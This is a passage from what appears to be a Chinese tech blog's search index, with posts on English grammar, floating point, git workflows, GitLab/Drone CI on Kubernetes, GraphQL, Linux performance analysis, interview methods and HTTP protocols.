的意思\n\n\nagainst: 面對面，-&gt;&lt;-\n\n\n說問句\n\n想問什麼 (what, how, why, …)\n有動作嗎? 時態是? (did, have, will, …)\n後面照着原本的句子說\n\n\n\neng的common errors\n\nworth\n\nIt is worth Ving/N\nworthwhile: This book is worthwhile\nworthy: A is worthy of B\n\n\n看起來像地點的adv\n\ngo\n\nhere\nthere\naboard\nanythere\nupstairs\ninside\n\n\n(x) I like there\n\n(o) I like it there\n\n\n一般的地點\n\ngo to the store/park\n\n\n\n\nprep\n\n節目、內容\n\non xxx:\n\nthe show on TV\nthe video on TV\n\n\nin xxx:\n\nhistory in the book\n(*) story in the newspaper\n\n\n\n\n人物、情節\n\nin xxx:\n\nbad guy in the show\n\n\n\n\n\n\nmost 整體\n\nmost persons\nmost of the persons\n\n書是說沒有most of 的用法，一定要加the\n\n\n\n\nof 整體(Ns)\n\n(x) one of my friend\n\n(o) one of my friends\n\n\n\n\n\n","categories":["English"]},{"title":"英文寫作教學資源","url":"/2021/10/eng-writing-resources/","content":"動機\nlinggle真的好用\n\n教學\nOnline Creative Writing Courses Offered Free by Top Universities and Educational Websites\nPurdue Online Writing Lab\nsearch engine\n下面兩個是查用法，像後面要接什麼介詞之類的\nnetspeak\nlinggle\n查同義詞\nthesaurus\n","categories":["English"]},{"title":"floatpoint","url":"/2021/10/floatpoint/","content":"動機\n複習浮點數\n\nIEEE 754\n\n\n(dec) 8.5\n(轉成bin) 1000.1\n(移到只剩下一個1) 1.0001 * 2^3\n開始填回去\n\nsign: 0 (正的)\nexponent: 127+3 = 130 = 10000010\n\n以127為分界點，IEEE 547定義\n\nexponent放127以及fraction為0時整個是0\n\n\n\n\nfraction: 把小數點右邊的直接填上去\n\n\n\n誤差\n就是後面的fraction，如果說遇到一個沒辦法被2整除的小數，就會一直產生新的數字，自然就不夠放，也自然就會出現奇怪的結果\n雙精度?\n\nPrecision (準確度) 和 Accuracy (精密度)\nAccuracy: 出現的資料是對的\nPrecision: 出現的資料夠多 (表現出的格子數夠多)\nAccurate &amp;&amp; Precise\n3.14159\nAccurate &amp;&amp; Inprecise\n3.14\nInaccurate &amp;&amp; Precise\n3.14128\nInaccurate &amp;&amp; Inprecise\n3.22\noverflow\n整數有overflow，float也會!!\n(1e20 * 1e20) * 1e20 為 +INF\n1e20 * (1e20 * 1e-20) 為 1e20\n1e20 * (1e20 - 1e20) 為 0.0\n1e20 * 1e20 - 1e20 * 1e20 為 NaN\n補數\n什麼是負數?\n有負號的數字\n但有負號不好表示與運算，所以重新定義\na+b = 0\na與b互為對方的負數，或是補數(相加之後就會滿，利用有儲存範圍的限制這一點)\n假設用1byte去存\n1補數: a+b = 1111\n* 這樣會有+0與-0 !!\n2補數: a+b = (1)0000\n怎麼算\n1補數: NOT\n2補數: NOT+1\nRef\nIEEE-754 與浮點數運算\n你所不知道的 C 語言：數值系統篇\n從 IEEE 754 標準來看為什麼浮點誤差是無法避免的\n浮點數的美麗與哀愁 (裡面的case都很有趣)\n","categories":["C++","FAQ"]},{"title":"各種git的workflow","url":"/2021/10/git-workflow/","content":"動機\n有3種整理一下\n\nflow\n\n以master為主\n\nmaster的所有commit都是可以跑的版本\ngit flow\n\n分成master與develop\n\ndevelop就是開發用\n從master分支出develop，之後合到master\n\n中間可能有\n\nhotfix: 從master分支，之後commit到master與develop\nrelease: 到master前做測試的部分\n\n\n在master上打tag標version\n\n\n\n\n\n\ngithub flow\n\n主要是master與其他\n在其他branch作開發，pull request，最後merge回去master\n整體與git flow很像，但是沒有分很多branch\n\n\n\n\n以develop為主\n\n在git flow中叫develop，gitlab flow叫master\n之後就是有許多branch\n\npre-release\n\nprodution\n2.5.7-stable\n\n一個branch就是一個version\n\n\n\n\n\n\n\n\n\n","categories":["Utils","Git"]},{"title":"在k8s跑gitlab ci與drone ci","url":"/2021/10/gitlab-ci-drone-ci-on-k8s/","content":"動機\n記錄用，網路上都沒有可以copy-paste的範例，所以po上來\n\nserver &amp; runner\nserver: 送job的\nrunner: 跑job的\ngitlab ci\nserver: 就是gitlab\nrunner\n\n先到project的Settings-&gt;CI/CD-&gt;Runner把registration token複製起來\nhelm install gitlab/gitlab-runner --generate-name -f val.yml\n\n要配自己的val.yml\ngitlabUrl: https://git.your-gitlab.net/runnerRegistrationToken: tgPR8jSJNftJ2Dphsm-7concurrent: 10checkInterval: 30rbac:  create: false  clusterWideAccess: falserunners:  image: ubuntu:16.04  privileged: false  builds:    cpuRequests: 100m    memoryRequests: 128Mi  services:    cpuRequests: 100m    memoryRequests: 128Mi  helpers:    cpuRequests: 100m    memoryRequests: 128Mi\n剩下就是.gitlab-ci.yml\n#variables:#  POSTGRES_PASSWORD: &quot;example&quot;test-job1:  stage: test  image: python  script:  - python3 -c &quot;print(f&#x27;&#123;1+10&#125;&#x27;)&quot;  - lstest-srv:  stage: test  variables:    POSTGRES_PASSWORD: &quot;example&quot;  services:    - postgres  script:    - apt update    - apt install -y postgresql-client    - pg_isready -d postgres -h localhost -U postgres -p 5432\ngitlab是分phase，裡面放job，每個job就是跑在runner的環境，所以每個job的環境都是一致，很像在自己下指令到cli\n另外job也可以綁service，引入其他container來做網路服務\ndrone ci\nserver:\n\n先到user的settings-&gt;application填redirect url\n\nhttp://&#123;DRONE_SERVER_HOST&#125;/login\n勾 api, read_user, read_repository, write_repository\n\n\n用下面的yaml\n\nhelm的chart的drone很舊\nkubectl apply -f server.yaml\n\n\n之後就是k8s-ip:31111就可以連到drone server\n\napiVersion: apps/v1kind: Deploymentmetadata:  name: serverspec:  replicas: 1  selector:    matchLabels:      name: server  template:    metadata:      labels:        name: server    spec:      containers:      - name: server        image: drone/drone:2        ports:        - containerPort: 80        env:          # http://&#123;your ip or domain&#125;:31111/login          - name: &quot;DRONE_SERVER_HOST&quot;            value: &quot;&#123;your ip or domain&#125;:31111&quot;          - name: &quot;DRONE_GITLAB_SERVER&quot;            value: https://git.your-gitlab.net/          - name: &quot;DRONE_GITLAB_CLIENT_ID&quot;            value: YOUR ID          - name: &quot;DRONE_GITLAB_CLIENT_SECRET&quot;            value: YOUR SECRET          - name: &quot;DRONE_SERVER_PROTO&quot;            value: http          # openssl rand -hex 16          - name: &quot;DRONE_RPC_SECRET&quot;            value: generate from the previous command          # open debug if you need it          #- name: &quot;DRONE_LOGS_DEBUG&quot;          #  value: &quot;true&quot;          #- name: &quot;DRONE_GITLAB_SKIP_VERIFY&quot;          #  value: &quot;true&quot;          #- name: &quot;DRONE_LOGS_PRETTY&quot;          #  value: &quot;true&quot;          #- name: &quot;DRONE_LOGS_COLOR&quot;          #  value: &quot;true&quot;---apiVersion: v1kind: Servicemetadata:  name: server  labels:    name: serverspec:  type: NodePort  ports:    - protocol: TCP      port: 80      nodePort: 31111  selector:    name: server\nrunner\n\n直接跑下面的yaml\n\nkubectl apply -f runner.yaml\n\n\n\napiVersion: apps/v1kind: Deploymentmetadata:  name: runnerspec:  replicas: 1  selector:    matchLabels:      name: runner  template:    metadata:      labels:        name: runner    spec:      containers:      - name: runner        image: drone/drone-runner-kube:latest        ports:        - containerPort: 3000        env:          - name: &quot;DRONE_RUNNER_CAPACITY&quot;            value: &quot;2&quot;          - name: &quot;DRONE_RPC_HOST&quot;            value: server          - name: &quot;DRONE_RPC_PROTO&quot;            value: http          - name: &quot;DRONE_RPC_SECRET&quot;            value: f52a6a49a61a17deb258e63d2cb8b018          - name: &quot;DRONE_LOGS_DEBUG&quot;            value: &quot;true&quot;          - name: &quot;DRONE_LOGS_PRETTY&quot;            value: &quot;true&quot;          - name: &quot;DRONE_LOGS_COLOR&quot;            value: &quot;true&quot;        volumeMounts:        - mountPath: /var/run/docker.sock          name: docker-socket      volumes:      - name: docker-socket        hostPath:          path: /var/run/docker.sock\n剩下就是.drone.yml\nkind: pipelinetype: kubernetesname: defaultplatform:  os: linux  arch: amd64services:- name: db  image: postgres  environment:    POSTGRES_PASSWORD: &quot;example&quot;steps:- name: greeting  image: python  commands:  - python3 -c &quot;print(f&#x27;&#123;1+10&#125;&#x27;)&quot;  - ls- name: service   image: ubuntu:latest  commands:    - echo hi    - apt update    - apt install -y postgresql-client    - pg_isready -d postgres -h db -U postgres -p 5432    - echo done\n寫在最後\n兩個文件都不怎麼好懂，drone最不好懂\n網路上的k8s安裝用的apiversion都太舊變成要自己寫\n同時因為k8s做validate的錯誤訊息(或是因該說compile msg)與g++一樣都是異常複雜，所以改yaml的過程很痛苦!!\n","categories":["Utils","CI","Gitlab CI"]},{"title":"graphql的理解","url":"/2021/10/graphql-tutorial/","content":"動機\n有碰到，紀錄一下\n\n基本上就是\nquery\nquery可以當成，\n\n一個function call，後面接filter\n在filter中依據前面function call的return，再取值做function call\n直到遇到return值是scalar type，如果還是function就繼續call\n\nserver\n\n定義三顆tree，query, mutation, subscription\n\ntree的node就是物件的attribute\n\nattribute對到function或是scalar type\n\n所以不能直接回array之類的collection，這裡是graphql會處理\n\n\n\n\n\n\n\n例子\nschema定義tree的樣子與type\ntype Query &#123;  info: String!  feed: [Link!]!  link(id: ID!): Link&#125;type Mutation &#123;  post(url: String!, description: String!): Link!&#125;type Link &#123;  id: ID!  description: String!  url: String!  hi(arg: String): String!&#125;\nresolver定義怎麼抓值，重要的是function的signatrue\n\nparent就是上一層的回傳值\nargs就是定義在schema的參數\ncontext在定義graphql server時給定的全域變數\n\n順便嘴一下js的function，可以省略參數是怎麼回事\n這樣很難讀懂，也不好找資料，因為根本沒關鍵字，\n另外函數最重要的就是參數，連這個都不知道有什麼是要怎麼開發，js這個設計真的不行\nconst resolvers = &#123;  Query: &#123;    info: () =&gt; `This is the API of a Hackernews Clone`, //string or () -&gt; string    //feed: links /* Error !! */    feed: () =&gt; links, /* must be function !! */    link: (parent, args, context) =&gt; &#123;        console.log(args,context)        return links.filter(obj =&gt; obj.id === args.id)[0]    &#125;  &#125;,  Mutation: &#123;    post: (parent, args, context, info) =&gt; &#123;      let idCount = links.length       const link = &#123;        id: `link-$&#123;idCount++&#125;`,        description: args.description,        url: args.url,      &#125;      links.push(link)      return link    &#125;  &#125;,  Link: &#123;    id: (parent) =&gt; parent.id,    description: (parent) =&gt; parent.description,    url: (parent) =&gt; parent.url,    hi: (parent, &#123;arg&#125;) =&gt; arg ? arg+&quot; 123!&quot; : &quot;hi!!&quot;  &#125;&#125;\nquery就是query\nquery QueryNameWhatever &#123;  feed &#123;     hi  &#125;&#125;\n呼應到attribute就是function，注意到只能用named arg去call!!\nquery QueryNameWhatever &#123;  feed &#123;     hi(arg: &quot;123&quot;)  &#125;&#125;\n用function與filter來看\nquery QueryNameWhatever &#123;  feed &#123; /* call query中的 feed的function */    id /* call feed return值中的id function */    hi(arg: &quot;123&quot;) /* call feed return值中的hi function */  &#125;&#125;\n整個query也可以當成function\nquery ExampleQuery($hiarg: String!)&#123;  feed &#123;    id    hi(arg: $hiarg)  &#125;&#125;&#123;  &quot;hiarg&quot;: &quot;123&quot;&#125;\nquery還有其他工具，但不是重點，跳過\nsubscribe\n這邊沒有去實驗subscribe，但可以猜一下是幹嘛\nsubscribe就是連線，負責拿publish的資料\nresolve負責對收到的資料做修飾，在傳回去user之前\ntype Subscription &#123;  newLink: Link&#125;function newLinkSubscribe(parent, args, context, info) &#123;  return context.pubsub.asyncIterator(&quot;NEW_LINK&quot;)&#125;const newLink = &#123;  subscribe: newLinkSubscribe,  resolve: payload =&gt; &#123;    return payload  &#125;,&#125;module.exports = &#123;  newLink,&#125;// 之後把newLink放到resolver的obj中\nRef\nRealtime GraphQL Subscriptions\nA Simple Query\n","categories":["Rails","FAQ"]},{"title":"怎麼分析系統","url":"/2021/10/how-to-analyze-system/","content":"動機\n紀錄\n\nuse method\n建立一個checklist去分析system的performance (bottleneck, error)\nchecklist的項目是建立在系統resource的utilization, saturation, errors\nsystem\n系統有\n\nresource: 任何有限制或上限的資源\n\n限制\n\nsoftware: hypervisor, container\n\nCPU, network, mem, io\n\n\nhardware: 硬體本身的spec, network throughput\n\n\nutilization: 在一段時間，有多少時間是忙的\n\n100%: 有bottleneck，但要確認saturation與實際上的影響\n\n像deadlock就是整個都會停下來\n\n\n&gt;=70%\n\n如果單位時間太長，會讓utilization少，把小的burst藏起來\n\n\n\n\nsaturation: 有多少工作是因為太忙無法處理的\n\n低utilization代表沒有saturation?\n\n也許長時間的utilization低，但是\n短時間的burst，就可以讓utilization衝到100%!!\n\n\n如果有saturation就是有事，去看在queue的waiting time或是queue length\n\n\nerrors: error events!!\n\n有就是出事，尤其在效能低下時\n\n\n\n\n\n另一個是描述系統各元件溝通與連結的Functional Block Diagram\n如果不懂，找個硬體工程師吧\n\n可以在每個箭頭上標他們的bandwidth，有的時候光是這樣就會知道bottleneck在哪\n\n有什麼資源\n\n\nCPUs: sockets, cores, hardware threads (virtual CPUs)\n\n\nMemory: capacity\n\n\nNetwork interfaces\n\n\nStorage devices: I/O, capacity\n\n\nControllers: storage, network cards\n\n\nInterconnects: CPUs, memory, I/O\n\n通常不是這裡成為bottleneck，但如果是就要考慮zero-copy之類的技術\n\n\n\nmutex locks\n\nutilization: 鎖被持有多久\nsaturation: 有多少process在等\n\n\n\nthread pools\n\nutilization: 所有thread處理的時間\nsaturation: 有多少request還沒被pool受理\n\n\n\nprocess/thread/file descriptor capacity\n\nutilization: 有多少process被allocate (一般來說process的數量都有上限)\nsaturation: 還沒被allocation process還有多少\nerror: fork失敗之類的\n\n\n\n有趣的是，cache不在裡面，因為cache是幫助system在高利用率與高飽和率時讓system變好的，所以USE method不會去看cache\nUSE method是看會被高utilization與高saturation搞垮的元件\n在跑完USE method之後可以看其他效能指標，cache miss等等\n指標\n\nresourcetypemetric\nCPUutilizationCPU utilization (either per-CPU or a system-wide average)\nCPUsaturationrun-queue length or scheduler latency(aka \nMemory capacityutilizationavailable free memory (system-wide)\nMemory capacitysaturationanonymous paging or thread swapping (maybe \"page scanning\" too)\nNetwork interfaceutilizationRX/TX throughput / max bandwidth\nStorage device I/Outilizationdevice busy percent\nStorage device I/Osaturationwait queue length\nStorage device I/Oerrorsdevice errors (\"soft\", \"hard\", ...)\n\n\n\nresourcetypemetric\nCPUerrorseg, correctable CPU cache ECC events or faulted CPUs (if the OS+HW supports that)\nMemory capacityerrorseg, failed malloc()s (although this is usually due to virtual memory exhaustion, not physical)\nNetworksaturationsaturation related NIC or OS events; eg \"dropped\", \"overruns\"\nStorage controllerutilizationdepends on the controller; it may have a max IOPS or throughput that can be checked vs current activity\nCPU interconnectutilizationper port throughput / max bandwidth (CPU performance counters)\nMemory interconnectsaturationmemory stall cycles, high CPI (CPU performance counters)\nI/O interconnectutilizationbus throughput / max bandwidth (performance counters may exist on your HW; eg, Intel \"uncore\" events)\n\n單位都是 次數、一段時間的平均數\n另外不是所有指標都可以取得，有些指標需要自己寫程式去拿\n指令 (for linux)\n\nuptime\n\n看\n\n想用CPU的process\n在等uninterruptible IO(disk io)的process\n\n\n測量時間單位: 1min, 5min, 15mins\n\n\ndmesg | tail\n\n看\n\nerror: tcp drop, oom-kill\n\n\n\n\nvmstat 1: 1秒一行\n\nr: 有多少想用CPU的process\nfree: free mem\nsi, so: swap-in, swap-out (有就是實體記憶體沒了)\nus, sy, id, wa, st: total cpu time\n\nuser, system(kernel), idle, wait io, stolen\n\n可以看出cpu忙不忙 (user+system)\nwait io可以看成idle，這可以當成idle的理由\n\n\n\n\n\n\nmpstat -P ALL 1: 所有cpu，1秒一行\n\n與前面很像，但是可以看到每個virtual cpu的usage\n這是有irq與sortirq，都是中斷，通常是用kernel處理的資料，像網路\n\n\npidstat 1\n\n很像top，但是以時間為主\n會列出當下再跑的process以及process的cpu時間\n\n\niostat -xz 1\n\nr/s, w/s, rkB/s, wkB/s: read, write的速度\nawait: io的時間，如果比一般情況還差就是device出事\navgqu-sz: 有多少req在等，大於1就是device saturation\n%util: Device utilization\n\n有的dev是logic的，所以就算util 100%，背後的裝置也許很閒\n\n\n\n\nfree -m\n\n就是看有沒有0，有就是記憶體要用完了\n\n\nsar -n DEV 1\n\n看network iface的throughput\n\n\nsar -n TCP,ETCP 1\n\n看tcp connection!!\n\nactive/s: 有多少從host出去的tcp\npassive/s: 有多少從remote進來的tcp\nretrans/s: retransmits\n\n\n\n\ntop\n\n再一次確認這裡看到的數字是不是與之前差不多\ntop是以process去排列，這樣不好觀察pattern\n\nCtrl-S to pause, Ctrl-Q to continue\n\n\n\n\n\ntsa method\ntsa處理thread的performance\n\n觀察thread在各個state所花費的時間\n根據各個state所花費的時間去研究root cause\n\nstate\n\nExecuting: on-CPU\nWaiting:\n\nRunnable: and waiting for a turn on-CPU\n\nuser (userspace)\nkernel (kernel space)\n\n\nAnonymous Paging: (aka swapping) runnable, but blocked waiting for residency\nSleeping: waiting for I/O, including network, block, and data/text page-ins\n\n可以依據sleep的理由往下切\n\nstorage\nnetwork\nother\n或是\n\nuninterruptibe wait\ninterruptibe wait\n\n\n\n\n\n\nLock: waiting to acquire a synchronization lock (waiting on someone else)\n\n\nIdle: waiting for work\n\nAnonymous Paging應該往下畫\n\nThe Runnable, Anonymous Paging, Sleeping, and Lock states measure time spent waiting while performing work: a measure of latency.\nTuning these latency states often provides the greatest wins, as their state time can be reduced to zero.\n像是Anonymous Paging太多(應該要是趨近0才對)，就去看memory\n該看什麼 (怎麼與system相關)\n\nStateDescriptionInvestigate\nExecutingRunning on-CPUSplit into user and system time.\nFor user time, use CPU profilers to identify hot code paths.\nFor system time, examine syscall rates, and profile kernel CPU time. Profiling can include Flame Graphs. Note that CPU time can include spinning on a lock.\nRunnableRun queue latencyCheck system-wide CPU utilization and saturation, for both physical CPUs and any imposed resource controls (eg, USE Method). Check for any processor binding, which can affect CPU scheduling.\nAnonymous PagingRunnable, but either swapped-out or paged-out, and waiting for residencyCheck system-wide main memory availability. Also check for any resource control limiting memory usage. Saturation metrics can be studied: paging and swapping (eg, following the USE Method).\nSleepingWaiting for I/O, including network, block, and data/text page-insCheck syscalls, resource usage, thread blocking. Syscalls: identify time in syscalls and identify the related resource; also check for mmap() usage and non-syscall I/O via mappings. Resource usage: eg, the USE Method to identify busy resources. Thread blocking: trace scheduler off-CPU events with user  and kernel stacks to identify reason; see Off-CPU Performance Analysis.\nLockWaiting to acquire a synchronization lock (waiting on someone else)Identify the lock the thread is waiting on, and the reason it took time to acquire. Lock analysis.\nIdleWaiting for workCheck the client load applied.\n\n下面是Solaris的例子\n\nRef\nThe USE Method\nThe TSA Method\nLinux Performance Analysis in 60,000 Milliseconds\nNetflix at Velocity 2015: Linux Performance Tools\n","categories":["System","Performance"]},{"title":"怎麼survey","url":"/2021/10/how-to-survey/","content":"動機\n這篇是結合採訪、寫作、survey的總結文\n採訪與survey很像但不同是面對的是人，所以另外用quote的方式附上採訪的重點\n\n怎麼產生問題?\n\n替換一部份，看會發生什麼結果\n為什麼是這個結果\n明明是同一類型，感受卻不同\n\n什麼感受\n\n\n有稀有的物件嗎?\n有極化的數據嗎?\n\n採訪(研究一個人)的話\n\n不要問初階的蠢問題，也不要問普遍能套在每一個人身上的泛泛之論，這代表你一點功課都沒做，先做功課，才能問出進階的問題，問到對方心坎裡\n那個畫面其實非常短暫，一閃而逝，多年前我第一次看以天安門六四學運為背景的《頤和園》，並沒有看到這個鏡頭。那次採訪婁燁前，我把他的電影全部找出來重看一遍。只能說天道酬勤，這個可能連一秒都不到的畫面，先決條件一，或許要看兩三遍後不被劇情牽著走，才能發覺這個微小的細節，條件二，要能看得懂他的「用典」，知道是楚浮的電影。\n\n\n\n人物訪問我通常會做受訪者個人年表（出生、畢業、結婚等），佐以歷史年表，例如二二八、美麗島、解嚴、文革、六四……他當時幾歲（也兼及他的父、母親，祖父、母幾歲），他肯談當然好，如果沒有，為什麼這段歷史記憶在他的生命史留白。\n\n\n我會特別留意一個人的青年時代，那個時期將觸角開始伸往世界，容易帶著理想主義，如果他持續下來了，為什麼？如果他改變了，又為了什麼？事先做功課，如果知道年輕時代影響他的書籍和電影，在時間許可下，我會盡可能都找來看。\n\n\n\n要讓人物立體有層次感，當然不能只聽他說，大量的側訪，就是在光中尋影。\n以前在《壹週刊》人物組，要求記者一個人物必須要有5個以上的側訪，採訪他的家人朋友同事等等。\n\n\n儘管只是襯托紅花的綠葉，都會以面對面訪問為優先，電訪其次。見面三分情，為了一個側訪，我曾專程搭高鐵去台中，如果只透過電話，對方會想要很快將你打發，見了面，記者有說有笑表情十足，就是一個活生生可託付「秘密」的人。\n\n\n第一次側訪的內容，完全不能用。第二次側訪，將她的人際關係往外擴一圈，找的不是最親近的摯友，只是蘇建和案曾合作的法律界一般友人，才終於問到可用的細節。\n\n\n側訪的最高等級，是找到他的敵人。敵人不一定是字面意義上的敵人，而是處於亦敵亦友的灰色地帶，或者就是所謂的瑜亮情結。\n\n收集資料的方向\n\n要研究的、類似的領域\n\n各家說法\n\n關鍵字\n要素、性質\n\n\n\n\n只有擦到邊的、背景的領域\n\n採訪(研究一個人)的話\n\n採訪之前先給訪綱，我通常會列10個問題（不多也不少），列訪綱就是一種功力，什麼問題在先，什麼問題在後，輕重緩急需有層次。\n\n\n訪綱主要的用意是寫給受訪者看，在露出的冰山之下，還有隱藏版的秘密問題，是不得不問，但直接列在訪綱裡會讓對方產生戒心，需暖場之後才圖窮匕見，夾藏在其他問題裡不經意問出來。\n\n\n\n如果迷了路，不要慌張。每個受訪者都是一本大書，打開他，一定有可觀之處。一個人閱讀的軌跡，往往可以卻顧所來徑。如果可以選擇，我最想去受訪者的書房，看他們有什麼書，所有的蛛絲馬跡都在書架上，藏也藏不住。\n\n\n\n有些時候，重點不是受訪者回答了什麼，而是他的肢體動作、舉手投足、服飾衣著、說話語速的輕重快慢，甚至是呼吸喘氣的頻率，都很有戲。\n\n\n我對刺點的理解是畫面中的不協調、矛盾與衝突。遭遇一個人，來到一個陌生的場域，通常我印象最深刻的，是破壞和諧、格格不入的一個小細節，擾動後形成張力。\n\n\n除了眼鏡，還有鞋子。初次見到一個人，我最喜歡觀察他穿什麼鞋子，鞋子是一個人身上最容易被忽略，但卻是最接地氣的配件\n\n\n\n離開現場，觀察並不是就此結束了，儘管只是事後整理錄音檔，都最好不要請別人代勞。首要當然是整理出逐字稿，而魔鬼往往藏在細節裡，藏在一個顫音，一次結巴，或一串暢快的笑聲中。\n\n整理 &amp; 收集 的loop\n\n中間會遇到關鍵字，一開始會不清楚，但隨著資料找得越多，會抓到關鍵字之間的關係，或是說這個domain想表達的東西、結構\n\n\n有的時候不知道這關鍵字是什麼或是關鍵字之間的關係?\n\n這通常出現在遇到不熟的domain時經驗不夠多，不知道keyword\n\n用其他類似domain的詞硬湊\n把domain的基本知識補完\n\n\n\n\n\n\n留意資料的品質\n\n\n敘事、評論要留意\n\n問的問題對不對\n使用的客觀事實對不對\n推導過程對不對\n結論有沒有與立論相關\n\n很常看到的是偷渡概念\n\n也就是同一名詞但代表的概念不同，讓後面的論述可以變成自己喜歡的結論\n\n\n其他的可以找紀錄常見謬誤的書\n\n\n\n\n技術類要看\n\n概念、結構\n\n很多時候資料就是一堆keyword砸在一起\n\n\n發行時間\n能不能重現\n以及前面的四點\n\n\n文中的哪邊能參考，而哪邊需要再思考一下、不該全盤接收，可以挑自己需要的\n\n問題 (概念、結構)\n客觀事實\n推導過程\n結論\n\n\n參考、工具類要看\n\n有沒有你要的關鍵字\n\n\n\n\n看完資料後可以知道\n\n\n瞭解文章的分類（是工具類的文章？純現況介紹？有無作者主觀推論？）\n能列出文章的大綱和脈絡\n瞭解作者嘗試想要解答的問題，說出作者撰寫本文的主旨\n能說出文章中「關鍵字」的定義或作者的詮釋\n說出作者解決了哪些問題、還有哪些問題還沒解決\n\n\n等資料整理的差不多，就可以寫了\n\n\n定義關鍵字\n\n用已知比較未知\n用具體比喻抽象\n\n\n動機 &amp; 原本想問的問題與收集資料時想到的問題\n\n點出與讀者的相關性\n連結讀者的生活經驗\n破題解答很多人都困惑的問題\n打臉讀者 (製造衝突)\n\n你以為是A，其實是B\n\n\n\n\n各方立場\n結論\n\n認識新領域最重要的領域的思考模型，而思考模型會由每個領域的keyword來實體化，但是有人不是完全懂或是寫的太詳細，導致阻礙理解\n這個時候只能多看，讓腦幫你整理，如果一個字總是遇到，像每一篇資料都有，就應該直接去找他的定義\n\n所以survey就是在收集資料、提問、整理之間一直loop，會有結束的一天嗎??\n所以最初提問題就要界定範圍!\nRef\n調查報導工作坊分享：人物採訪的五項心法\n如何快速從「 陌生領域」整理出一套心得？\n如何寫出一篇好懂的文章以利溝通？六大技巧分享\n用一張圖學會專業知識寫作心法：怎樣得到學測國語文寫作測驗那 21 分？\n","categories":["Etc"]},{"title":"http-protocol","url":"/2021/10/http-protocol/","content":"動機\n記錄用\n\nhttp 1.0\n一個http req對到一個tcp socket。\n以每個檔案為單位，去開http request，所有網頁有關的檔案都會各自開一個http。\n等拿到一個檔案再開下一個http request。\nheader\n\n內容 協商,類型,編碼\n\n名詞\nrequest\n\nAccept\n\n資料的類型，要看MIME\n\n像 application/json, */*\n\n\n權重: application/xml;q=0.9,application/json, text/*;q=0.8\n\napplication/json最高(1)，application/xml次高(0.9)\n\n\n\n\nAccept-Charset\n\n就是charset，像utf8\n\n\nAccept-Encoding\n\n怎麼壓縮資料\n\n\nAccept-Language\n\n就是語言\n\n\n\n\nresponse\n\nContent-Type\n\n對到Accept &amp; Accept-Charset\n\napplication/x-www-form-urlencoded; charset=utf-8\n\n這是form表單\npayload會像name=tom&amp;password=9487\n\n\n\n\n\n\nContent-Encoding\n\n對到Accept-Encoding\n\n\nContent-Language\n\n對到Accept-Language\n\n\nContent-Location\n\n資料的實際位置\n\n\n\n\n\n\ncache\n\nCache-Control\n\nno-store: 每次都重拿\nno-cache: 每次都發req驗證\nmax-age: max-age=10，十秒後才會發req\nstale-while-revalidate: 先拿原本的cache，同時在背景向伺服器發送請求\npublic &amp; private:\n\n\n\n\n\n\n\nLast-Modified &amp; Etag\n\n都是cache的stamp\n\n一個是 時間\n一個是 hash(md5)\n\n\n\n\nIf-Modified-Since &amp; If-None-Match\n\n就是驗證時把stamp丟給server看的\n\n\n\n\nReferer &amp; Refresh\n\nrequest\n\nReferer: 上一個網址\n\n\nresponse\n\nRefresh: 重新導向跳轉 (5秒後跳到w3)\n\nRefresh: 5; url=http://www.w3.org\n\n\n\n\n\n\n同源\n\nrequest\n\nOrigin: 我的domain是\nAccess-Control-Request-Origin: 向server發問這個origin會不會過同源\n\n後面的Origin還可以換成 Methods, Headers\n\n\n\n\nresponse\n\nAccess-Control-Allow-Origin: 能吃的domian\n\n後面的Origin還可以換成 Methods, Headers\n\n\n\n\n\n\n\nhttp 1.1\nhttp1會開很多tcp socket，tcp socket也是要$，所以有了keep-alive\nkeep-alive\n在header放，Connection: Keep-Alive，表示這個socket傳完不用關掉\n只要server也有一樣的response，就是使用keep-alive\n但只限制在該網頁，所以現在http1.1是以每個網頁為單位，只要不同tab就是新的tcp socket\npipeline\n現在有keep-alive，但還是只能等拿到一個檔案再開下一個http request。\n所以有pipeline，可以先給多個http request，但是\n\nserver還是一個一個回且照順序 (head-of-line blocking)\n只能用於GET, HEAD之類，Idempotent的verb\n\nwebsocket\n有了keep-alive，但server沒辦法主動推資料給client\n如果client要更新資料只能自己做poll，雖說有數個技術，但就只是差在poll後會保留多久這個用來查詢更新的socket\n所以有了websocket，與http同樣用80,443 port，但是包自己的pkt header，就可以把資料切小(frame)，讓接收端重組資料(少了flow-control、congestion-control的tcp)\n 0                   1                   2                   3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-------+-+-------------+-------------------------------+|F|R|R|R| opcode|M| Payload len |    Extended payload length    ||I|S|S|S|  (4)  |A|     (7)     |             (16/64)           ||N|V|V|V|       |S|             |   (if payload len==126/127)   || |1|2|3|       |K|             |                               |+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +|     Extended payload length continued, if payload len == 127  |+ - - - - - - - - - - - - - - - +-------------------------------+|                               |Masking-key, if MASK set to 1  |+-------------------------------+-------------------------------+| Masking-key (continued)       |          Payload Data         |+-------------------------------- - - - - - - - - - - - - - - - +:                     Payload Data continued ...                :+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +|                     Payload Data continued ...                |\n使用方法是\n\n先發http req，但裡面放\n\nUpgrade: websocket\nConnection: Upgrade\n\n\n如果ok，server的res也會有一樣的東西，之後就是websocket了\n\nServer-sent events(sse)\n但是這是新protocol，有沒有方法在http上做改進?\nServer-sent events就是在傳回資料時，標這是streaming，讓client不要關連線。\n這樣能完成server push，但是只有單向!!\n用法是\n\n放下面的header\n\nContent-Type: text/event-streamCache-Control: no-cacheConnection: keep-alive\n\n開始丟資料 (資料有另外的格式，但這裡跳過)\n\nhttp2\n一次大改版，可以想成在tcp與http1.1之間引入一層轉換層，來達成下面4點\n\n都用binary\n\nhttp原本都是text\nwebsocket可以是text也可以是binary\n\n\n會壓縮header\n所有東西都分割成frame傳輸，\n\nmultiplexing: 不用等前面的檔案傳好!! 直接傳各自組合\nPrioritization: 可以列優先序\n\n\nserver push\n\nserver可以把資料先推到client的cache\nwebsocket與sse都是與應用程式溝通，這裡是cache!!\n\n\n\n\nwebsocket是重新設計自己的protocol，使用http的port\nhttp2是使用http的header與語意，但是改變資料的表現方式與處理方式\nwebsocket是新protocol，http2是改進的http\nhttp2與websocket都可以在同一條路上同時傳輸(full-deplex)!!\n但http2的方向主要是client-&gt;server之後server-&gt;server，server push沒有真正的雙向，websocket才是真正的雙向\nRef\nHTTP persistent connection\nWhat is the difference between HTTP/1.1 pipelining and HTTP/2 multiplexing?\nHTTP 內容協商\nHTTP 內容類型\nHTTP Cache 